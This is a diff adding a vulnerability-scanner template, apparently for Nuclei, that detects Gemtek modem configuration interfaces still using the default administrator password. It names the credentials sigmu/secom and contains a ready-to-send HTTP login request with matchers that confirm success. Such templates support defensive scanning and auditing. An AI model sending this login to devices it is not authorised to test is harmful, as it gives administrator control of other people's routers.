@@ -1,0 +1,28 @@
+id: gemtek-modem-default-password
+info:
+  name: Gemtek Modem Configuration Interface Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Modem Configuration Interface is an unlimited router management system. There is a default password in the system (sigmu/secom) that allows an attacker to control the entire platform and operate core functions with administrator privileges.
+  tags: default-password
+  reference:
+    - https://fofa.info/
+http:
+  - raw:
+      - |
+        POST /cgi-bin/sysconf.cgi?page=login.asp&action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user_name=sigmu&user_passwd=secom&user_lang=en
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "setCookie(\"sid\")"
+          - "NewLinkHref(\"index.asp\")"
